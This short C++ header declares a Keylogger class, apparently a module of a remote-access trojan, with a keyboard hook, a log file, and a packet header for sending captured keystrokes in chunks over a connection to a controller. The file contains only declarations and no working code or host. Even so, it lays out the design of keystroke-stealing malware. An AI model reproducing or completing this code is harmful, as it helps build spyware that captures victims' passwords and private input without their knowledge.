#include "bone_obj.h"

#define KEYLOGGER_GETLOG		0
#define KEYLOGGER_LOG_SPECIAL	1
#define KEYLOGGER_GETCONF		2

#define KEYLOGGER_LOGHEADER		L"~[Keylogger Started]"

#pragma pack(push, 1)
struct KeylogHeader
{
	BYTE	ID;
	DWORD	totalSize;
	DWORD	sizeLeft;
	DWORD	chunkSize;
};
#pragma pack(pop)

class Keylogger:public BoneObj
{
public:
	virtual void OnInit();
	virtual void OnPacketArrived(BYTE*, size_t);
	virtual void OnExit();
	Keylogger(Connection*, WCHAR*);
	~Keylogger();
	bool			Start();
	bool			Stop();
	friend LRESULT	OurKeyBoardProc(Keylogger*, int nCode, WPARAM wparam, LPARAM lparam);
	friend void		DispatchHook(Keylogger* KeyloggerObj);
private:
	bool			InstallHook();
	bool			UnInstallHook();
	bool			SetupLogFile();
	bool			WriteLog(WCHAR*);
	bool			CloseLog();
	WCHAR			logPath[MAX_PATH];
	HWND			oldhWnd;
	HWND			newhWnd;
	HKL				keyboardLayout;
	HANDLE			hLog;
	HHOOK			eHook;
};